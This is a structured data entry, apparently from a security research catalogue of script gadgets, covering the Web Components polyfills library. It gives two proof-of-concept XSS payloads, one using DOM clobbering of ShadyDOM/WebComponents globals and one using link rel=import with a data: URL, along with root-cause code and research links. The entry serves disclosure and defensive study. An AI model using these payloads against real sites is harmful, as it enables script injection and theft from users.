---
description: The Web Components polyfills are a suite of JavaScript libraries that implement [Web Components](https://developer.mozilla.org/en-US/docs/Web/API/Web_components) APIs for browsers that don't have built-in support.
github: webcomponents/polyfills
gadgets:
  Latest:
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - src-attr
      - name-attr
      - before-lib-load
    pocs:
      - description: Since the payload uses [HTML Collection](https://developer.mozilla.org/fr/docs/Web/API/HTMLCollection), it won't works on Firefox.
        code: |
          <!-- user input -->
          <a id="ShadyDOM"></a>
          <a id="ShadyDOM" name="force"></a>
          <a id="WebComponents"></a>
          <a id="WebComponents" name="root" href="[current-location]/assets/xss/"></a>

          <script src="https://unpkg.com/@webcomponents/webcomponentsjs@2.8.0/webcomponents-loader.js"></script>
    more-info: |
      **Root Cause**

      Source: <a target="_blank" href="https://github.com/webcomponents/polyfills/blob/16a0a1e87f67c2604381b904b4edd8cd112e5b04/packages/webcomponentsjs/webcomponents-loader.js#L114">https://github.com/webcomponents/polyfills/blob/16a0a1e87f67c2604381b904b4edd8cd112e5b04/packages/webcomponentsjs/webcomponents-loader.js#L114</a>

      ```javascript
      var polyfills = [];
      if (
        !(
          'attachShadow' in Element.prototype && 'getRootNode' in Element.prototype
        ) ||
        (window.ShadyDOM && window.ShadyDOM.force)
      ) {
        polyfills.push('sd');
      }
      if (!window.customElements || window.customElements.forcePolyfill) {
        polyfills.push('ce');
      }
      ```

      Source: <a target="_blank" href="https://github.com/webcomponents/polyfills/blob/16a0a1e87f67c2604381b904b4edd8cd112e5b04/packages/webcomponentsjs/webcomponents-loader.js#L190">https://github.com/webcomponents/polyfills/blob/16a0a1e87f67c2604381b904b4edd8cd112e5b04/packages/webcomponentsjs/webcomponents-loader.js#L190</a>

      ```javascript
      if (window.WebComponents.root) {
        url = window.WebComponents.root + polyfillFile;
        if (
          window.trustedTypes &&
          window.trustedTypes.isScriptURL(window.WebComponents.root)
        ) {
          url = policy.createScriptURL(url);
        }
      }
      ```
    links:
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/polyfills.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
  ≤1.3.3:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - link-tag
      - rel-attr
      - href-attr
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: The [polyfills](https://github.com/webcomponents/polyfills) library was using `link rel="import"` to specify additional HTML to load.
        code: |
          <link rel="import" href="data:text/html,<script>alert(document.domain)</script>">

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/webcomponentsjs/1.3.3/webcomponents-lite.js"></script>
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ajaxify.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/ajaxify_exploit.php
---
